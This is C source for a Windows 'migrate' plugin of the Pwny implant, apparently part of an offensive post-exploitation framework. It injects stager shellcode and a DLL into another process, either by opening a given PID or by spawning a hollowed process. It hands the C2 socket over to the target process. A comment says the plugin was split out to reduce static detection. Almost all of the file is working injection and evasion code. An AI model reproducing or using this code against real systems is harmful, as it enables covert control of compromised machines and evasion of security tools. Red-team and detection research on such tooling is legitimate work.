/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Migrate tab plugin — staged process migration with anonymous sections.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 *
 * This plugin includes stager_x64.S which provides the embedded stager
 * shellcode (stager_x64_start / stager_x64_end symbols).
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <stdarg.h>
#include <string.h>
#include <pwny/c2.h>
#include <pwny/log.h>
#include <pwny/tunnel.h>
#include <pwny/net_client.h>

#include <pwny/windows/inject_tech.h>

#define MIGRATE_BASE 29

#define MIGRATE_LOAD \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       MIGRATE_BASE, \
                       API_CALL)

#define TLV_TYPE_INJECT_TECHNIQUE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIGRATE_BASE, API_TYPE)

#define TLV_TYPE_MIGRATE_ERROR \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, MIGRATE_BASE, API_TYPE)

/*
 * Helper: build a FAIL response with an embedded error string.
 */

static tlv_pkt_t *migrate_fail(c2_t *c2, const char *fmt, ...)
{
    tlv_pkt_t *pkt;
    char buf[256];
    va_list ap;

    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    log_debug("* migrate FAIL: %s\n", buf);

    pkt = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    tlv_pkt_add_string(pkt, TLV_TYPE_MIGRATE_ERROR, buf);
    return pkt;
}

/*
 * Convert an RVA to a raw file offset using the PE section headers.
 */

static DWORD migrate_rva_to_offset(DWORD rva, PIMAGE_SECTION_HEADER sections,
                                   WORD num_sections)
{
    WORD i;

    for (i = 0; i < num_sections; i++)
    {
        if (rva >= sections[i].VirtualAddress &&
            rva < sections[i].VirtualAddress + sections[i].SizeOfRawData)
        {
            return rva - sections[i].VirtualAddress +
                   sections[i].PointerToRawData;
        }
    }

    return rva;
}

/*
 * Find the file offset of a named export in a PE image buffer.
 * Returns 0 on failure.
 */

static DWORD migrate_find_loader_offset(LPVOID lpBuffer, DWORD dwLength,
                                        LPCSTR funcName)
{
    UINT_PTR base;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sections;
    PIMAGE_EXPORT_DIRECTORY exports;
    WORD num_sections;
    DWORD export_rva;
    DWORD *names;
    DWORD *functions;
    WORD *ordinals;
    DWORD i;

    base = (UINT_PTR)lpBuffer;
    dos = (PIMAGE_DOS_HEADER)base;

    if (dwLength < sizeof(IMAGE_DOS_HEADER) ||
        dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return 0;
    }

    nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    if (nt->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }

    if (nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
        export_rva = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        num_sections = nt64->FileHeader.NumberOfSections;
        sections = (PIMAGE_SECTION_HEADER)((UINT_PTR)&nt64->OptionalHeader +
                                           nt64->FileHeader.SizeOfOptionalHeader);
    }
    else if (nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)nt;
        export_rva = nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        num_sections = nt32->FileHeader.NumberOfSections;
        sections = (PIMAGE_SECTION_HEADER)((UINT_PTR)&nt32->OptionalHeader +
                                           nt32->FileHeader.SizeOfOptionalHeader);
    }
    else
    {
        return 0;
    }

    if (export_rva == 0)
    {
        return 0;
    }

    exports = (PIMAGE_EXPORT_DIRECTORY)(base +
                  migrate_rva_to_offset(export_rva, sections, num_sections));

    names = (DWORD *)(base +
                migrate_rva_to_offset(exports->AddressOfNames, sections, num_sections));
    ordinals = (WORD *)(base +
                   migrate_rva_to_offset(exports->AddressOfNameOrdinals, sections, num_sections));
    functions = (DWORD *)(base +
                    migrate_rva_to_offset(exports->AddressOfFunctions, sections, num_sections));

    for (i = 0; i < exports->NumberOfNames; i++)
    {
        char *name = (char *)(base +
                        migrate_rva_to_offset(names[i], sections, num_sections));

        if (strstr(name, funcName) != NULL)
        {
            return migrate_rva_to_offset(functions[ordinals[i]],
                                         sections, num_sections);
        }
    }

    return 0;
}

static tlv_pkt_t *migrate_load(c2_t *c2)
{
    int pid;
    int size;
    int technique;
    unsigned char *image;

    HANDLE hProcess;
    HANDLE hDupSocket;
    HANDLE hDllSection;
    HANDLE hDupDllSection;

    LPVOID lpDllView;
    LPVOID lpRemote;

    DWORD dwLoaderOffset;
    DWORD dwOldProt;

    SOCKET c2_sock;
    net_t *net;
    PROCESS_INFORMATION hollow_pi;
    BOOL is_hollow;

    /* Stager context — patched and written to remote process. */
    typedef struct __attribute__((packed))
    {
        UINT_PTR pfnMapViewOfFile;      /* +0x00 */
        UINT_PTR pfnVirtualAlloc;       /* +0x08 */
        UINT_PTR pfnVirtualProtect;     /* +0x10 */
        UINT_PTR pfnUnmapViewOfFile;    /* +0x18 */
        UINT_PTR pfnCloseHandle;        /* +0x20 */
        DWORD    dwDllSize;             /* +0x28 */
        DWORD    dwLoaderOffset;        /* +0x2C */
        UINT_PTR hDllSection;           /* +0x30 */
        UINT_PTR hDupSocket;            /* +0x38 */
    } stager_context_t;

    /* Stager shellcode — assembled from stager_x64.S in this plugin */
    extern unsigned char stager_x64_start[];
    extern unsigned char stager_x64_end[];

    SIZE_T stager_code_size;
    SIZE_T stager_total_size;
    HMODULE hKernel32;
    stager_context_t ctx;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid) < 0)
    {
        pid = 0;
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_INJECT_TECHNIQUE,
                         &technique) < 0)
    {
        technique = INJECT_TECH_DEFAULT;
    }

    is_hollow = (technique == INJECT_TECH_HOLLOW);
    memset(&hollow_pi, 0, sizeof(hollow_pi));

    log_debug("* migrate: staged injection, technique %d%s\n",
              technique, is_hollow ? " (hollow)" : "");

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &image);
    if (size <= 0)
    {
        return migrate_fail(c2, "no DLL image in request");
    }

    /* Find the self-loader export in the DLL image */

    dwLoaderOffset = migrate_find_loader_offset(image, (DWORD)size,
                                                "_DllInit");
    if (dwLoaderOffset == 0)
    {
        free(image);
        return migrate_fail(c2, "_DllInit not found in PE exports");
    }

    log_debug("* migrate: _DllInit at offset 0x%lx\n",
              (unsigned long)dwLoaderOffset);

    /* ---- Acquire target process ---- */

    if (is_hollow)
    {
        if (!inject_hollow_spawn(&hollow_pi))
        {
            free(image);
            return migrate_fail(c2, "hollow spawn failed (%lu)", GetLastError());
        }

        hProcess = hollow_pi.hProcess;
        pid = (int)hollow_pi.dwProcessId;
        log_debug("* migrate: hollow child PID %d\n", pid);
    }
    else
    {
        if (pid == 0)
        {
            free(image);
            return migrate_fail(c2, "no PID specified for non-hollow technique");
        }

        hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
            PROCESS_DUP_HANDLE,
            FALSE, (DWORD)pid
        );

        if (hProcess == NULL)
        {
            free(image);
            return migrate_fail(c2, "OpenProcess(%d) failed (%lu)", pid, GetLastError());
        }
    }

    /* Get the C2 socket from the active tunnel */

    net = (net_t *)c2->tunnel->data;
    c2_sock = (SOCKET)net->io->pipe[0];

    /* Duplicate the C2 socket into the target process */

    if (!DuplicateHandle(
            GetCurrentProcess(), (HANDLE)c2_sock,
            hProcess, &hDupSocket,
            0, FALSE, DUPLICATE_SAME_ACCESS))
    {
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "DuplicateHandle failed (%lu)", GetLastError());
    }

    log_debug("* migrate: duplicated socket %llu -> %llu in PID %d\n",
              (unsigned long long)c2_sock,
              (unsigned long long)(ULONG_PTR)hDupSocket, pid);

    /* ---- Anonymous DLL section ---- */

    hDllSection = CreateFileMappingA(
        INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
        0, (DWORD)size, NULL
    );

    if (hDllSection == NULL)
    {
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "CreateFileMapping (DLL) failed (%lu)", GetLastError());
    }

    lpDllView = MapViewOfFile(hDllSection, FILE_MAP_WRITE, 0, 0, (SIZE_T)size);
    if (lpDllView == NULL)
    {
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "MapViewOfFile (DLL) failed (%lu)", GetLastError());
    }

    memcpy(lpDllView, image, (SIZE_T)size);
    UnmapViewOfFile(lpDllView);
    free(image);

    /* Duplicate the anonymous section handle into the target process */

    if (!DuplicateHandle(
            GetCurrentProcess(), hDllSection,
            hProcess, &hDupDllSection,
            0, FALSE, DUPLICATE_SAME_ACCESS))
    {
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "DuplicateHandle (dll section) failed (%lu)", GetLastError());
    }

    log_debug("* migrate: DLL (%d bytes) in anonymous section, dup handle %llu\n",
              size, (unsigned long long)(ULONG_PTR)hDupDllSection);

    /* ---- Build stager context ---- */

    hKernel32 = GetModuleHandleA("kernel32.dll");

    memset(&ctx, 0, sizeof(ctx));
    ctx.pfnMapViewOfFile    = (UINT_PTR)GetProcAddress(hKernel32, "MapViewOfFile");
    ctx.pfnVirtualAlloc     = (UINT_PTR)GetProcAddress(hKernel32, "VirtualAlloc");
    ctx.pfnVirtualProtect   = (UINT_PTR)GetProcAddress(hKernel32, "VirtualProtect");
    ctx.pfnUnmapViewOfFile  = (UINT_PTR)GetProcAddress(hKernel32, "UnmapViewOfFile");
    ctx.pfnCloseHandle      = (UINT_PTR)GetProcAddress(hKernel32, "CloseHandle");
    ctx.dwDllSize           = (DWORD)size;
    ctx.dwLoaderOffset      = dwLoaderOffset;
    ctx.hDllSection         = (UINT_PTR)hDupDllSection;
    ctx.hDupSocket          = (UINT_PTR)hDupSocket;

    /* ---- Inject stager cross-process ---- */

    stager_code_size  = (SIZE_T)(stager_x64_end - stager_x64_start);
    stager_total_size = stager_code_size + sizeof(stager_context_t);

    log_debug("* migrate: stager code=%llu ctx=%llu total=%llu bytes\n",
              (unsigned long long)stager_code_size,
              (unsigned long long)sizeof(stager_context_t),
              (unsigned long long)stager_total_size);

    lpRemote = VirtualAllocEx(
        hProcess, NULL, stager_total_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
    );

    if (lpRemote == NULL)
    {
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "VirtualAllocEx (stager) failed (%lu)", GetLastError());
    }

    /* Write stager code */
    if (!WriteProcessMemory(hProcess, lpRemote,
                            stager_x64_start, stager_code_size, NULL))
    {
        VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "WriteProcessMemory (stager) failed (%lu)", GetLastError());
    }

    /* Write context immediately after stager code */
    if (!WriteProcessMemory(hProcess,
                            (BYTE *)lpRemote + stager_code_size,
                            &ctx, sizeof(ctx), NULL))
    {
        VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "WriteProcessMemory (ctx) failed (%lu)", GetLastError());
    }

    /* Flip to RX */
    if (!VirtualProtectEx(hProcess, lpRemote, stager_total_size,
                          PAGE_EXECUTE_READ, &dwOldProt))
    {
        VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "VirtualProtectEx (stager) failed (%lu)", GetLastError());
    }

    /* Execute stager via chosen technique */

    if (is_hollow)
    {
        if (!inject_hollow_redirect(hProcess, hollow_pi.hThread, lpRemote))
        {
            TerminateProcess(hProcess, 1);
            VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
            CloseHandle(hollow_pi.hThread);
            CloseHandle(hDllSection);
            CloseHandle(hProcess);
            return migrate_fail(c2, "hollow redirect failed (%lu)", GetLastError());
        }

        CloseHandle(hollow_pi.hThread);
    }
    else
    {
        if (!inject_execute_code(technique, hProcess, (DWORD)pid,
                                 lpRemote, NULL))
        {
            VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
            CloseHandle(hDllSection);
            CloseHandle(hProcess);
            return migrate_fail(c2, "code execution failed (technique %d, err %lu)", technique, GetLastError());
        }
    }

    log_debug("* migrate: staged injection succeeded (technique %d, PID %d)\n",
              technique, pid);
    log_debug("* migrate: cross-process write: %llu bytes (vs %d DLL)\n",
              (unsigned long long)stager_total_size, size);

    CloseHandle(hProcess);

    return api_craft_tlv_pkt(API_CALL_QUIT, c2->request);
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, MIGRATE_LOAD, (api_t)migrate_load);
}

#endif
